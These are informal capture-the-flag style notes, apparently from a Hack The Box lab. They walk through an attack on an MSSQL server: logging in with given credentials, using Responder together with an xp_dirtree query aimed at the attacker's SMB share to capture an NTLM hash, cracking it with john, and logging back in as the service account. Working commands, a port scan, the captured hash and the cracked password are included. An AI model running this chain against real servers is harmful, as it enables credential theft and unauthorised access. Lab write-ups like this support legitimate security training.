# Login using sqlcmd
```
sqlcmd -S 10.129.203.12 -U htbdbuser -P 'MSSQLAccess01!' -y 30 -Y 30
```

Start responder to steal NTLM hash
```
sudo /home/azureuser/miniconda3/envs/hacking/bin/python Responder.py -I tun0
```

Have sql execute following query
```
EXEC master..xp_dirtree '\\10.10.14.197\share\'
```

The hash is dumped by Responder to a file in the logs folder (see docs)
We can the crack it
```
john --wordlist=rockyou.txt hash2.txt
```

We cracked tha password and it is:
```
mssqlsvc:princess1    
```

Then we can use windows authentication to authenticate against sqlserver using that account:
```
Username needs to be all CAPS? WERID!!
python mssqlclient.py MSSQLSVC@10.129.203.12 -windows-auth
```


impacket-mssqlclient MSSQLSVC@10.129.203.12 -windows-auth

Host is up (0.018s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE
25/tcp   open  smtp
110/tcp  open  pop3
143/tcp  open  imap
587/tcp  open  submission
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server




mssqlsvc::WIN-02:2bac5c7581358870:EFAF4E182CCCB73E560F6B8185C79A2C:01010000000000008069FEAE3032DC018CB2689DCEBF38C60000000002000800380046004500360001001E00570049004E002D005600470048004D0054004F0042005A0048003200580004003400570049004E002D005600470048004D0054004F0042005A004800320058002E0038004600450036002E004C004F00430041004C000300140038004600450036002E004C004F00430041004C000500140038004600450036002E004C004F00430041004C00070008008069FEAE3032DC0106000400020000000800300030000000000000000000000000300000CDC7C38B81AF3957C8ED33EFEEDD6447B9F72B192A9FE637FAECEFF161B4A69E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100390037000000000000000000